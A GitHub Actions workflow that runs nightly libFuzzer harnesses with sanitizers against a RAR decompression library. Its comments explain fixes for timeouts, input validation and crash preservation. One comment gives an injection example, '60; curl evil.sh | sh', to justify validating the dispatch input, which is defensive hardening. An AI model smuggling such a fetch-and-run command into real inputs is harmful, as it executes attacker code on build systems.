name: Nightly Fuzzing & Sanitizers

on:
  schedule:
    - cron: '0 2 * * *' # Run at 2 AM UTC daily
  workflow_dispatch:
    inputs:
      duration:
        description: 'Duration per libFuzzer harness in seconds (max 900)'
        required: false
        default: '60'

# build.yml has this; fuzz.yml did not. Without it a manual dispatch that
# overlaps the nightly runs two jobs that both write tests/fuzz/seeds/ and
# both save distinct cache keys.
concurrency:
  group: fuzz-${{ github.ref }}
  cancel-in-progress: false

jobs:
  fuzz:
    name: Continuous Fuzzing
    runs-on: ubuntu-latest
    # The harnesses are wall-clock bounded (-max_total_time, validated above)
    # and -timeout caps any single input, but a wedged harness or a stuck
    # setup step would otherwise burn the full 6 h default ceiling.
    timeout-minutes: 120
    env:
      UBSAN_OPTIONS: halt_on_error=1
      ASAN_OPTIONS: detect_leaks=1
      # Scheduled runs have no dispatch input. This used to be 1800s, which
      # made the nightly math 5 harnesses x 30 min + build > the 120 min
      # timeout-minutes below: every scheduled run for a week ended
      # "cancelled" at the ceiling without finishing fuzz_inflate or
      # fuzz_file_handle. 600s per harness is ~65 min total, roughly 2x
      # under the ceiling, and the ceiling still breaks a wedged harness.
      # Raise the bound below and timeout-minutes together if longer runs
      # are wanted: (duration * 5) + build must stay under the ceiling.
      FUZZ_TIME: ${{ github.event.inputs.duration || '600' }}

    steps:
      - name: Checkout repository
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.4.0

      - name: Create seeds directory
        run: |
          mkdir -p tests/fuzz/seeds
          mkdir -p tests/fuzz/extra_seeds
          shopt -s nullglob
          seeds=(tests/*.rar)
          if [ ${#seeds[@]} -eq 0 ]; then
            echo "::error::no tests/*.rar fixtures found to seed the corpus"
            exit 1
          fi
          cp "${seeds[@]}" tests/fuzz/extra_seeds/

      - name: Validate fuzz duration
        # workflow_dispatch inputs are free text. This value used to be
        # interpolated straight into the `run:` script of each harness, so a
        # dispatch with duration `60; curl evil.sh | sh` would have executed
        # as shell. Validate it once here, then reference it only as the
        # quoted shell variable "$FUZZ_TIME" - never as a template expansion.
        run: |
          set -euo pipefail
          if ! [[ "$FUZZ_TIME" =~ ^[0-9]+$ ]]; then
            echo "::error::duration must be an integer in [10, 900], got '$FUZZ_TIME'"
            exit 1
          fi
          # 10# forces base 10; without it a leading zero makes bash read the
          # value as octal, so '060' would silently mean 48 seconds.
          #
          # Upper bound 900, not the previous 86400: the job is a ceiling
          # (timeout-minutes: 120) over 5 sequential harnesses plus build.
          # A duration above ~1000 per harness guarantees the job dies at the
          # ceiling mid-harness, which is exactly how the scheduled 1800s
          # default failed every night. Raising the cap and the ceiling are a
          # paired change.
          if (( 10#$FUZZ_TIME < 10 || 10#$FUZZ_TIME > 900 )); then
            echo "::error::duration must be an integer in [10, 900], got '$FUZZ_TIME'"
            exit 1
          fi
          echo "fuzz duration: $((10#$FUZZ_TIME))s per harness"

      - name: Restore fuzzer corpus
        # Persist the corpus across nightly runs so coverage accumulates
        # instead of restarting from the dummy seed every night.
        uses: actions/cache@0057852bfaa89a56745cba8c7296529d2fc39830 # v4.3.0
        with:
          path: tests/fuzz/seeds
          key: fuzz-corpus-${{ github.run_id }}
          restore-keys: fuzz-corpus-

      - name: Install clang
        # The libFuzzer harnesses are Clang-only (CMakeLists.txt gates
        # OPENRAR_USE_LIBFUZZER on the compiler ID). Ubuntu's default CMake
        # compiler is GCC, which silently skipped the libFuzzer wiring and
        # degraded the nightly to the seconds-long standalone sweep (R1).
        run: sudo apt-get update && sudo apt-get install -y clang

      - name: Configure CMake (Fuzzing enabled)
        run: |
          cmake -B build_fuzz -G Ninja \
            -DCMAKE_C_COMPILER=clang \
            -DCMAKE_CXX_COMPILER=clang++ \
            -DCMAKE_BUILD_TYPE=Release \
            -DOPENRAR_FUZZ=ON \
            -DOPENRAR_SANITIZERS=ON \
            -DOPENRAR_CROSS_VALIDATE=ON

      - name: Build Fuzzers
        run: cmake --build build_fuzz --parallel

      - name: Assert libFuzzer harnesses built (not the standalone fallback)
        # The -max_total_time flags below are libFuzzer flags; the standalone
        # main() fallback ignores them, so a silent fallback would burn the
        # nightly on a fixed 2000-iteration sweep while CI reported success.
        #
        # Count rather than `grep -q`: Actions runs bash with -eo pipefail, and
        # `strings BIN | grep -q PAT` makes grep exit on first match, which
        # SIGPIPEs strings and returns 141 — so the assertion failed even when
        # libFuzzer was linked. `grep -c` consumes all input, so no SIGPIPE.
        run: |
          for f in fuzz_decompress fuzz_archive fuzz_file_handle fuzz_inflate fuzz_target; do
            if [ ! -x "./build_fuzz/$f" ]; then
              echo "::error::$f was not built"
              exit 1
            fi
            if [ "$(strings "./build_fuzz/$f" | grep -c libFuzzer)" -eq 0 ]; then
              echo "::error::$f was built without libFuzzer (standalone fallback — check the compiler wiring above)"
              exit 1
            fi
          done

      - name: Run Roundtrip Fuzzer (Deterministic Sweep)
        # fuzz_roundtrip keeps its own main(): a fixed deterministic sweep,
        # not a libFuzzer target — safe to run without a time limit.
        run: ./build_fuzz/fuzz_roundtrip

      - name: Run Decoder Fuzzer (libFuzzer mode)
        # The explicit clang compilers above make CMake define
        # OPENRAR_USE_LIBFUZZER and link -fsanitize=fuzzer (see
        # CMakeLists.txt), so this is a real libFuzzer run over
        # the accumulated corpus, saving new inputs back into tests/fuzz/seeds/.
        # tests/fuzz/extra_seeds/ directory passes fixtures as read-only extra seeds
        # (valid RAR5 header shapes; libFuzzer writes new units only into the first dir).
        # -timeout=60 tolerates hostile lg2_count=24 PBKDF2 derivations (~seconds)
        # in the file-handle harness without flagging them as timeouts.
        # -timeout=60 on every harness, not just the file-handle one:
        # -max_total_time is only checked BETWEEN runs, so without it
        # libFuzzer's 1200 s default applies per input and one hostile input
        # can consume the whole budget and report nothing.
        run: ./build_fuzz/fuzz_decompress -max_total_time="$FUZZ_TIME" -timeout=60 tests/fuzz/seeds/ tests/fuzz/extra_seeds/

      - name: Fuzz codec (audit-driven target)
        # tests/fuzz/fuzz_target.cpp: hostile decode, compress->decompress
        # round trip with truncation/bit-flip oracles, sequential vs
        # two-phase differential, BitReader model check. Inputs are capped
        # at 256 KiB so round-trip lanes stay fast enough to explore.
        run: ./build_fuzz/fuzz_target -max_total_time="$FUZZ_TIME" -timeout=60 -max_len=262144 tests/fuzz/seeds/ tests/fuzz/extra_seeds/

      - name: Fuzz archive + block C ABI
        run: ./build_fuzz/fuzz_archive -max_total_time="$FUZZ_TIME" -timeout=60 tests/fuzz/seeds/ tests/fuzz/extra_seeds/

      - name: Fuzz inflate (deflate decoder)
        # fuzz_inflate was already a real libFuzzer target (CMakeLists.txt)
        # and was already asserted-to-build in the loop above, but no step
        # ever executed it and it is not in the ctest sweep either. It
        # covers the only DEFLATE decoder in the tree, which foreign_zip
        # feeds attacker-controlled streams.
        run: ./build_fuzz/fuzz_inflate -max_total_time="$FUZZ_TIME" -timeout=60 tests/fuzz/seeds/ tests/fuzz/extra_seeds/

      - name: Fuzz file-based surface
        # open_file / handle_extract_to_path / handle_test / list_file_pw over
        # the streaming reader: volume scan, extent stitching, chunked decrypt,
        # solid catch-up. Archives are materialised to disk with hostile
        # naming variants per input (see tests/fuzz/fuzz_file_handle.cpp).
        run: ./build_fuzz/fuzz_file_handle -max_total_time="$FUZZ_TIME" -timeout=60 tests/fuzz/seeds/ tests/fuzz/extra_seeds/

      - name: Dedup crashes (stack-signature buckets; new buckets survive)
        if: always()
        run: python3 tools/dedup_crashes.py

      - name: Upload new seeds (if any crashes or coverage expanded)
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
        if: always()
        with:
          name: fuzzer-corpus
          path: tests/fuzz/seeds/

      - name: Upload crash artifacts
        # libFuzzer writes ./crash-<sha1> and the roundtrip oracle writes
        # ./fuzz_target_failure.bin into the workspace; both died with the
        # runner on the first oracle finding (the reproducer was lost with
        # it, and the input had to be rediscovered locally). Preserve them.
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
        if: always()
        with:
          name: fuzzer-crashes
          path: |
            crash-*
            fuzz_target_failure.bin
          if-no-files-found: ignore
